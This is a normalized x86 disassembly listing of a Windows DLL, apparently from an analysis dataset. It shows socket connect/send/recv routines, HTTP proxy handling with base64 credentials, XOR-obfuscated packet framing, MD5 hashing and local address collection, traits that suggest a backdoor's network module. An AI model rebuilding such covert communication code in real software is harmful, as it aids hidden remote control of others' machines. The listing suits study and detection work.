mov al [ edi + 0x18 ]
mov [ ebp - 0x101 ] 0x3
mov [ ebp - 0x100 ] al
jb r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
test eax eax
je r-xdata
push 0x0
push 0x100
lea eax [ ebp - 0x104 ]
push eax
push [ edi ]
call [ recv@IAT ]
test eax eax
jle r-xdata
movzx esi al
push esi
lea eax [ ebp - 0xff ]
push ebx
push eax
call sub_10010170
movzx eax [ edi + 0x24 ]
add esp 0xc
push eax
call [ htons@IAT ]
mov [ ebp + esi - 0xff ] ax
add esi 0x7
mov ebx [ ebx ]
test ebx ebx
je r-xdata
mov ebx [ ebx ]
cmp [ ebp - 0x104 ] 0x1
jne r-xdata
push 0x0
push 0x100
lea eax [ ebp - 0x104 ]
push eax
push [ edi ]
call [ recv@IAT ]
test eax eax
jle r-xdata
xor eax eax
mov esi ebx
call sub_100068be
jmp r-xdata
cmp [ ebp - 0x103 ] 0x0
jne r-xdata
cmp [ ebp - 0x104 ] 0x5
jne r-xdata
push 0x0
push esi
lea eax [ ebp - 0x104 ]
push eax
push [ edi ]
call [ send@IAT ]
cmp eax esi
jne r-xdata
mov [ ebp - 0x100 ] eax
movzx eax [ edi + 0x24 ]
push eax
call [ htons@IAT ]
push 0xa
mov [ ebp - 0xfc ] ax
pop esi
jmp r-xdata
cmp [ ebp - 0x103 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
pop esi
sub_10006b52
push 0x30
mov eax sub_10016619
call sub_100157f2
xor ebx ebx
mov esi ecx
mov edi edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
push edi
call [ gethostbyname@IAT ]
cmp eax ebx
je r-xdata
push edi
call sub_100067f0
cmp al bl
je r-xdata
lea esi [ ebp - 0x2c ]
call sub_10003d60
xor al al
jmp r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
lea ecx [ ebp - 0x2c ]
push ecx
lea eax [ ebp - 0x2c ]
push eax
mov eax edi
jmp r-xdata
call sub_1001583c
retn 0x4
push 0x2
pop eax
push [ ebp + 0x8 ]
mov [ ebp - 0x3c ] ax
call [ htons@IAT ]
push edi
mov [ ebp - 0x3a ] ax
call [ inet_addr@IAT ]
mov [ ebp - 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
lea edi [ ebp - 0x2c ]
call sub_10003d90
cmp [ ebp - 0x18 ] 0x10
mov edi [ ebp - 0x2c ]
jae r-xdata
push 0x10
lea eax [ ebp - 0x3c ]
push eax
push [ esi ]
call [ connect@IAT ]
mov edi eax
call [ WSAGetLastError@IAT ]
mov [ esi + 0x84 ] eax
cmp edi ebx
je r-xdata
lea esi [ ebp - 0x2c ]
call sub_10003d60
mov al bl
mov bl 0x1
jmp r-xdata
cmp edi 0xffffffff
jne r-xdata
cmp eax 0x2733
jne r-xdata
sub_10006c28
push ebp
mov ebp esp
sub esp 0xd14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
lea eax [ esi + 0x28 ]
cmp [ eax + 0x14 ] 0x10
push edi
jb r-xdata
movzx ecx [ esi + 0x44 ]
push ecx
mov edx eax
mov ecx esi
call sub_10006b52
test al al
je r-xdata
mov eax [ eax ]
xor al al
push 0x3ff
lea eax [ ebp - 0x40f ]
push 0x0
push eax
mov [ ebp - 0x410 ] 0x0
call sub_1000ffa0
lea eax [ esi + 0x8 ]
mov ecx [ eax + 0x14 ]
add esp 0xc
cmp ecx 0x10
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
push [ esi + 0x80 ]
movzx ecx [ esi + 0x24 ]
push ecx
push edx
push ecx
push eax
push rw-data
mov edi 0x400
lea eax [ ebp - 0x410 ]
push edi
push eax
call sub_10009a25
lea eax [ ebp - 0x410 ]
add esp 0x20
lea ecx [ eax + 0x1 ]
mov eax [ eax ]
cmp ecx 0x10
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push 0x0
sub eax ecx
push eax
lea eax [ ebp - 0x410 ]
push eax
push [ esi ]
call [ send@IAT ]
lea ecx [ ebp - 0x410 ]
mov ebx eax
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
cmp ebx ecx
jne r-xdata
push edi
lea eax [ ebp - 0x410 ]
push 0x0
push eax
call sub_1000ffa0
add esp 0xc
push 0x0
push edi
lea eax [ ebp - 0x410 ]
push eax
push [ esi ]
call [ recv@IAT ]
test eax eax
jle r-xdata
lea eax [ ebp - 0x410 ]
mov [ ebp - 0x11 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0xf
jb r-xdata
push 0x9
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sub_1000a043
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x407 ]
push eax
call sub_10008ee4
pop ecx
test eax eax
je r-xdata
push 0x9
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sub_1000a043
add esp 0xc
test eax eax
jne r-xdata
cmp eax 0xc8
jne r-xdata
cmp eax 0x197
jne r-xdata
mov al 0x1
jmp r-xdata
and [ ebp - 0xd14 ] 0x0
and [ ebp - 0x8 ] 0x0
mov edi rw-data
lea eax [ ebp - 0x410 ]
push edi
push eax
call sub_10009f10
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x5
add eax ebx
push rw-data
push eax
call sub_10014f9d
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
mov [ ebp - 0xd14 ] 0x1
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push 0x9
add eax ebx
push rw-data
push eax
call sub_10014f9d
add esp 0xc
test eax eax
jne r-xdata
push edi
inc ebx
push ebx
call sub_10009f10
mov ebx eax
pop ecx
pop ecx
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
cmp [ ebp - 0xd14 ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp [ esi + 0x58 ] ebx
je r-xdata
cmp [ esi + 0x58 ] ebx
je r-xdata
call sub_10007352
push esi
call sub_10007422
test al al
je r-xdata
call sub_10007352
push esi
call sub_10007422
test al al
je r-xdata
push 0x10
lea eax [ esi + 0x28 ]
pop edi
cmp [ eax + 0x14 ] edi
jb r-xdata
lea eax [ esi + 0x28 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
movzx ecx [ esi + 0x44 ]
push ecx
mov edx eax
mov ecx esi
call sub_10006b52
test al al
je r-xdata
mov eax [ eax ]
movzx ecx [ esi + 0x44 ]
push ecx
mov edx eax
mov ecx esi
call sub_10006b52
test al al
je r-xdata
mov eax [ eax ]
cmp [ esi + 0x78 ] edi
jb r-xdata
lea eax [ ebp - 0x910 ]
push eax
call sub_10007ad0
pop ecx
lea ecx [ ebp - 0xd10 ]
push ecx
lea ecx [ ebp - 0x910 ]
call sub_100076f8
pop ecx
mov ecx [ esi + 0x1c ]
cmp ecx 0x10
jb r-xdata
lea ecx [ esi + 0x64 ]
mov ecx [ esi + 0x64 ]
jmp r-xdata
lea edx [ esi + 0x8 ]
mov edx [ esi + 0x8 ]
jmp r-xdata
push ecx
push eax
push r--data
lea eax [ ebp - 0x490 ]
push 0x80
push eax
call sub_10009a25
lea eax [ ebp - 0x490 ]
add esp 0x14
mov [ ebp - 0x411 ] bl
lea ecx [ eax + 0x1 ]
mov eax [ eax ]
lea eax [ esi + 0x48 ]
cmp [ eax + 0x14 ] edi
jb r-xdata
lea ecx [ esi + 0x8 ]
mov ecx [ esi + 0x8 ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
lea ecx [ ebp - 0x510 ]
push ecx
lea ecx [ ebp - 0x490 ]
call sub_100076f8
pop ecx
mov ecx [ esi + 0x1c ]
cmp ecx edi
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push ebx
sub eax ecx
push eax
lea eax [ ebp - 0x410 ]
push eax
push [ esi ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
movzx eax [ esi + 0x24 ]
lea edi [ ebp - 0xd10 ]
push edi
push [ esi + 0x80 ]
mov edi 0x400
push eax
push edx
push eax
push ecx
push rw-data
lea eax [ ebp - 0x410 ]
push edi
push eax
call sub_10009a25
lea eax [ ebp - 0x410 ]
add esp 0x24
lea ecx [ eax + 0x1 ]
lea edx [ esi + 0x8 ]
mov edx [ esi + 0x8 ]
jmp r-xdata
push ebx
push edi
lea eax [ ebp - 0x410 ]
push eax
push [ esi ]
call [ recv@IAT ]
test eax eax
jle r-xdata
lea ecx [ esi + 0x8 ]
mov ecx [ esi + 0x8 ]
jmp r-xdata
cmp ecx edi
jb r-xdata
lea eax [ ebp - 0x410 ]
push rw-data
push eax
mov [ ebp - 0x11 ] bl
call sub_10009f10
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push 0x0
mov ebx eax
push ebx
lea eax [ ebp - 0x410 ]
push eax
push [ esi ]
call [ send@IAT ]
cmp eax ebx
jne r-xdata
movzx eax [ esi + 0x24 ]
lea edi [ ebp - 0x510 ]
push edi
push [ esi + 0x80 ]
mov edi 0x400
push eax
push edx
push eax
push ecx
push rw-data
lea eax [ ebp - 0x410 ]
push edi
push eax
call sub_10009a25
lea eax [ ebp - 0x410 ]
add esp 0x24
lea ecx [ eax + 0x1 ]
mov edi r--data
push edi
push ebx
call sub_10009f10
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push edi
lea eax [ ebp - 0x410 ]
push eax
push [ esi ]
call [ recv@IAT ]
test eax eax
jle r-xdata
mov eax rw-data
lea ecx [ eax + 0x1 ]
lea eax [ ebp - 0x410 ]
mov [ ebp - 0x11 ] 0x0
lea edx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
add ebx eax
push edi
push ebx
call sub_10009f10
lea eax [ ebp - 0x910 ]
push eax
mov eax ebx
call sub_100077e7
add esp 0xc
mov ecx rw-data
lea eax [ ebp - 0x910 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0xf
jb r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
push 0x9
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sub_1000a043
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x908 ] 0x2
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
lea eax [ ebp - 0x407 ]
push eax
call sub_10008ee4
pop ecx
test eax eax
je r-xdata
push 0x9
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sub_1000a043
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x8f8 ]
push 0x10
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8f4 ]
pop edi
mov [ ebp - 0x8 ] eax
cmp [ esi + 0x78 ] edi
jb r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
cmp eax 0xc8
sete al
jmp r-xdata
lea ecx [ esi + 0x64 ]
mov ecx [ esi + 0x64 ]
jmp r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
push eax
lea eax [ ebp - 0x910 ]
push eax
lea edx [ ebp - 0xc ]
call sub_10007b11
lea ecx [ ebp - 0xd10 ]
push ecx
lea ecx [ ebp - 0x910 ]
call sub_100076f8
mov ecx [ esi + 0x1c ]
add esp 0xc
cmp ecx edi
jb r-xdata
mov eax [ eax ]
lea eax [ esi + 0x48 ]
cmp [ eax + 0x14 ] edi
jb r-xdata
lea edx [ esi + 0x8 ]
mov edx [ esi + 0x8 ]
jmp r-xdata
lea ecx [ esi + 0x8 ]
mov ecx [ esi + 0x8 ]
jmp r-xdata
cmp ecx edi
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push 0x0
sub eax ecx
push eax
lea eax [ ebp - 0x410 ]
push eax
push [ esi ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
movzx eax [ esi + 0x24 ]
lea edi [ ebp - 0xd10 ]
push edi
push [ esi + 0x80 ]
mov edi 0x400
push eax
push edx
push eax
push ecx
push rw-data
lea eax [ ebp - 0x410 ]
push edi
push eax
call sub_10009a25
lea eax [ ebp - 0x410 ]
add esp 0x24
lea ecx [ eax + 0x1 ]
push 0x0
push edi
lea eax [ ebp - 0x410 ]
push eax
push [ esi ]
call [ recv@IAT ]
test eax eax
jle r-xdata
lea eax [ ebp - 0x410 ]
mov [ ebp - 0x11 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0xf
jb r-xdata
push 0x9
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sub_1000a043
add esp 0xc
test eax eax
je r-xdata
push 0x9
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call sub_1000a043
add esp 0xc
test eax eax
je r-xdata
sub_100072d5
push ebx
push esi
push edi
mov esi eax
push esi
call sub_10007422
test al al
jne r-xdata
cmp [ esi + 0x80 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x18 ] 0x0
je r-xdata
movzx ecx [ esi + 0x24 ]
test cx cx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
cmp eax 0x1
jne r-xdata
push ecx
mov edx eax
mov ecx esi
call sub_10006b52
mov eax [ eax ]
cmp eax 0x2
jne r-xdata
mov ecx esi
call sub_10006c28
jmp r-xdata
mov al bl
call sub_10007352
xor bl bl
jmp r-xdata
mov edi esi
call sub_100068fd
jmp r-xdata
mov bl al
test bl bl
jne r-xdata
sub_1000736e
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ GetTickCount@IAT ]
call esi
cmp [ ebp + 0xc ] 0x0
mov [ ebp - 0x8 ] eax
jbe r-xdata
call [ WSAGetLastError@IAT ]
mov [ edi + 0x84 ] eax
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0x8
push ebx
pop ebx
call esi
sub eax [ ebp - 0x8 ]
cmp eax 0xffffffff
ja r-xdata
add [ ebp - 0x4 ] ebx
sub [ ebp + 0xc ] ebx
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ edi ]
call [ send@IAT ]
mov ebx eax
test ebx ebx
jle r-xdata
sub_100073c7
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ GetTickCount@IAT ]
xor esi esi
call edi
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] esi
jbe r-xdata
call [ WSAGetLastError@IAT ]
mov [ ebx + 0x84 ] eax
pop edi
mov eax esi
pop esi
leave
retn 0x8
mov eax [ ebp + 0x8 ]
push 0x0
push [ ebp + 0xc ]
add eax esi
push eax
push [ ebx ]
call [ recv@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
call edi
sub eax [ ebp - 0x4 ]
cmp eax 0xffffffff
ja r-xdata
mov eax [ ebp - 0x8 ]
add esi eax
sub [ ebp + 0xc ] eax
jne r-xdata
sub_10007440
push ebp
mov ebp esp
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0x50
push 0x0
push esi
call sub_1000ffa0
add esp 0xc
push 0x64
lea eax [ ebp - 0x68 ]
push eax
xor edi edi
call [ gethostname@IAT ]
lea eax [ ebp - 0x68 ]
push eax
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10008d64
leave
retn
cmp [ eax + 0x8 ] 0x2
jne r-xdata
mov eax edi
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax [ eax ]
inc edi
mov [ esi + ecx * 4 ] eax
inc ecx
add edx 0x4
cmp ecx 0x14
jl r-xdata
mov eax [ edx ]
test eax eax
je r-xdata
sub_100074aa
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ MultiByteToWideChar@IAT ]
push edi
xor edi edi
push edi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push edi
call esi
mov ebx eax
xor ecx ecx
push 0x2
pop edx
lea eax [ ebx + 0x1 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10008c7c
pop ecx
push ebx
push eax
push 0xffffffff
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push edi
push edi
call esi
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
sub_100074f4
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ GetProcessHeap@IAT ]
push 0x8
push 0x0
call edi
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
movzx ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
and [ ebx + 0x4 ] 0x0
and ecx 0x1f
shl ecx 0x3
and edx 0x7
or ecx edx
movzx edx [ ebp + 0xc ]
shl ecx 0x8
lea esi [ eax + 0x12 ]
or ecx edx
mov [ ebp - 0x13 ] ecx
mov [ ebp - 0xe ] eax
mov [ ebp - 0x1c ] esi
call sub_10009031
mov [ ebp - 0x4 ] eax
shl [ ebp - 0x4 ] 0x10
call sub_10009031
or eax [ ebp - 0x4 ]
push esi
push 0x0
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
call edi
push eax
call [ HeapAlloc@IAT ]
cmp [ ebp + 0x14 ] 0x0
mov [ ebx ] eax
je r-xdata
push 0xffffffff
call [ ExitProcess@IAT ]
mov edi [ ebx ]
push [ ebp + 0x14 ]
mov [ ebp - 0xf ] 0x0
push [ ebp + 0x18 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ ebx ]
add eax 0x12
push eax
call sub_10010170
mov eax [ ebx ]
xor esi esi
add esp 0xc
cmp [ ebp + 0x14 ] esi
jbe r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + esi ]
push eax
call sub_10008c7c
mov ecx [ ebp + 0x18 ]
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x14 ]
push edi
mov [ ebp - 0x8 ] edi
call sub_10007f87
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov cl [ ebp - 0x18 ]
xor [ esi + eax + 0x12 ] cl
inc esi
cmp esi [ ebp + 0x14 ]
jb r-xdata
push edi
call sub_10009014
pop ecx
mov esi [ ebp - 0x4 ]
cmp esi [ ebp + 0x14 ]
jae r-xdata
lea eax [ esi + 0x12 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx ]
push esi
add eax 0x12
push edi
push eax
mov [ ebp - 0xf ] 0x1
call sub_10010170
mov eax [ ebx ]
add esp 0xc
xor edi edi
test esi esi
je r-xdata
mov edi [ ebx ]
push [ ebp - 0x8 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_10009014
pop ecx
jmp r-xdata
mov cl [ ebp - 0x18 ]
xor [ edi + eax + 0x12 ] cl
inc edi
cmp edi esi
jb r-xdata
sub_10007638
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ eax ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
mov ecx [ esi ]
xor eax eax
sub ecx 0x12
push edi
je r-xdata
mov al 0x1
jmp r-xdata
cmp [ esi + 0xd ] 0x0
mov [ esi + 0x8 ] 0x1
je r-xdata
mov cl [ esi + 0x4 ]
xor [ eax + esi + 0x12 ] cl
mov ecx [ esi ]
inc eax
sub ecx 0x12
cmp eax ecx
jb r-xdata
pop esi
pop ebx
leave
retn
mov al 0x1
mov eax [ esi + 0xe ]
mov ebx [ GetProcessHeap@IAT ]
and [ ebp - 0x8 ] 0x0
add eax 0x12
push eax
push 0x0
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x8 ]
add eax 0x12
push ecx
push eax
mov eax [ esi ]
sub eax 0x12
lea ecx [ esi + 0x12 ]
call sub_10008053
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
xor al al
jmp r-xdata
mov eax [ esi + 0xe ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
pop edi
mov edi [ ebp - 0x4 ]
mov [ esi + 0xd ] 0x0
add eax 0x12
mov [ esi ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
push [ esi ]
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
sub_100076f8
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi eax
lea edx [ esi + edi - 0x2 ]
cmp esi edx
jae r-xdata
mov eax edi
push 0x3
cdq
pop edi
idiv edi
dec edx
je r-xdata
push ebx
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
and eax 0x3
shl eax 0x4
mov al [ eax + r--data ]
mov [ ecx + 0x1 ] al
mov [ ecx + 0x2 ] 0x3d3d
dec edx
jne r-xdata
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
movzx ebx [ esi + 0x1 ]
and eax 0x3
add eax eax
shr ebx 0x4
mov al [ ebx + eax * 8 + r--data ]
mov [ ecx + 0x1 ] al
movzx eax [ esi + 0x1 ]
movzx ebx [ esi + 0x2 ]
and eax 0xf
shr ebx 0x6
mov al [ ebx + eax * 4 + r--data ]
mov [ ecx + 0x2 ] al
movzx eax [ esi + 0x2 ]
and eax 0x3f
mov al [ eax + r--data ]
mov [ ecx + 0x3 ] al
add esi 0x3
add ecx 0x4
cmp esi edx
jb r-xdata
pop ebx
mov eax ecx
sub eax [ ebp + 0x8 ]
pop edi
mov [ ecx ] 0x0
pop esi
pop ebp
retn
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
movzx edx [ esi + 0x1 ]
and eax edi
add eax eax
shr edx 0x4
mov al [ edx + eax * 8 + r--data ]
mov [ ecx + 0x1 ] al
movzx eax [ esi + 0x1 ]
and eax 0xf
mov al [ eax * 4 + r--data ]
mov [ ecx + 0x2 ] al
mov [ ecx + 0x3 ] 0x3d
jmp r-xdata
add ecx 0x4
sub_100077e7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call sub_100097ee
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0x8 ]
jmp r-xdata
cmp bl 0x3d
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
or eax 0xffffffff
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
movsx esi al
shl esi 0x12
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call sub_100097ee
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
cmp bl 0x3d
je r-xdata
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
mov ecx [ ebp - 0x4 ]
movsx eax al
shl eax 0xc
or esi eax
mov eax esi
shr eax 0x10
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
mov [ ecx ] al
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call sub_100097ee
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
js r-xdata
cmp bl 0x3d
jne r-xdata
movzx eax bl
cmp [ eax + r--data ] 0x0
jge r-xdata
cmp bl 0x3d
jne r-xdata
mov ecx [ ebp - 0x4 ]
movzx eax bl
movsx eax [ eax + r--data ]
shl eax 0x6
or [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
shr eax 0x8
inc [ ebp - 0x4 ]
mov [ ecx ] al
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call sub_100097ee
pop ecx
test eax eax
jne r-xdata
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call sub_100097ee
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp bl 0x3d
je r-xdata
cmp bl 0x3d
je r-xdata
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
or al [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov [ ecx ] al
jmp r-xdata
sub_10007933
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov eax esi
push edi
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
lea edi [ ebp - 0x14 ]
cmp eax 0xe
jb r-xdata
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
mov eax esi
lea edx [ eax + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x14 ]
push esi
push eax
call sub_10010170
add esp 0xc
xor edi edi
inc edi
cmp edi 0xe
jl r-xdata
movzx eax al
push eax
call sub_1000a6ef
pop ecx
mov [ esi ] al
lea esi [ ebp + edi - 0x14 ]
mov al [ esi ]
test al al
je r-xdata
mov esi rw-data
push esi
mov ecx ebx
lea edx [ ebp - 0x14 ]
call sub_10008a7c
lea ecx [ ebx + 0x8 ]
push esi
lea edx [ ebp - 0xd ]
call sub_10008a7c
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008d64
leave
retn
sub_100079d1
push ebp
mov ebp esp
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
xor eax eax
mov [ ebp - 0x6c ] edi
stosd [ edi ]
mov eax ebx
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
lea eax [ eax + eax + 0x2 ]
push eax
call sub_10009991
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008d64
leave
retn
xor ecx ecx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
cmp ecx eax
jbe r-xdata
movsx ax [ ebx + ecx ]
mov [ edi + ecx * 2 ] ax
mov eax ebx
inc ecx
lea esi [ eax + 0x1 ]
and [ ebp - 0x54 ] 0x0
and [ ebp - 0x58 ] 0x0
mov eax edi
mov [ ebp - 0x68 ] 0x67452301
mov [ ebp - 0x64 ] 0xefcdab89
mov [ ebp - 0x60 ] 0x98badcfe
mov [ ebp - 0x5c ] 0x10325476
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ecx
sar eax 0x1
add eax eax
push edi
lea esi [ ebp - 0x68 ]
call sub_100082b2
pop ecx
push 0x8
pop edx
lea eax [ ebp - 0x58 ]
lea ecx [ ebp - 0xc ]
call sub_10008281
mov ecx [ ebp - 0x58 ]
shr ecx 0x3
push 0x38
and ecx 0x3f
pop eax
cmp ecx eax
jb r-xdata
sub eax ecx
push rw-data
lea esi [ ebp - 0x68 ]
call sub_100082b2
lea eax [ ebp - 0xc ]
push eax
push 0x8
pop eax
call sub_100082b2
mov ecx [ ebp - 0x6c ]
push 0x10
pop edx
mov eax esi
call sub_10008281
push edi
call sub_10009957
add esp 0xc
push 0x78
pop eax
sub_10007ad0
push ebp
mov ebp esp
mov eax r--data
push eax
push eax
xor eax eax
push eax
push eax
push eax
push 0x20
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push 0x20
push eax
push eax
push eax
push eax
push eax
push eax
push 0x2
push 0x2
push eax
push eax
push eax
push 0x1
push eax
push rw-data
push 0x400
push [ ebp + 0x8 ]
call sub_10009a25
add esp 0x78
pop ebp
retn
sub_10007b11
